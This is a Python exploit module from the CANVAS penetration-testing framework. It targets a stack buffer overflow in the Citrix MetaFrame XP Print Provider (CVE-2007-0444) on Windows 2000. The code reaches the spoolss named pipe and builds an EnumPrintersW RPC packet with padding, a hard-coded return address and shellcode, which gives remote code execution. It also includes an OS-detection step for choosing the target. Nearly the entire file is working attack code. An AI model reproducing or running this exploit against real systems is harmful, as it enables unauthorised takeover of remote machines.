#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_raw_unistring
import canvasengine

NAME='Citrix MetaFrame XP Print Provider Overflow'
DESCRIPTION='Citrix MetaFrame XP Print Provider Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Citrix"
DOCUMENTATION['Date public']='01/24/07'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-07-006.html'
DOCUMENTATION['Platforms Tested']=''
DOCUMENTATION['Notes']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-0444'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0444'
DOCUMENTATION['CVSS'] = 7.2
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
GTK2_DIALOG="dialog.glade2"

CHANGELOG="""
"""

NOTES="""
"""

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

targets={
    0: ['Autoversioning',0],
    1: ['Citrix MetaFrame XP on Windows 2000',0x1ecad4],
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version        = 0
        self.badstring      = '\x00\xff'
        self.UUID           = u'12345678-1234-abcd-ef00-0123456789ab'
        self.uuidversion    = u'1.0'
        self.targetfunction = 0 # EnumPrintersW
        self.name           = NAME

    def buildConnectionList(self):
        self.connectionList= ['ncacn_np:%s[\\spoolss]'%(self.host)]
        return self.connectionList

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        self.log('target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000')>-1:
            self.version = 1
            self.log('OS vulnerable: %s'%(result))
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildDcePacket(self):
        description,eip=targets[self.version]
        data='A'*0x24c
        data+=struct.pack('<L',eip)
        data+='B'*0x1c
        data+=self.shellcode
        if len(data)%2==1:
            data+='C'
        packet=intel_order(8)
        packet+=intel_order(1)
        packet+=s_dce_raw_unistring(data)
        packet+=intel_order(1)
        packet+=intel_order(0)
        packet+=intel_order(0)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
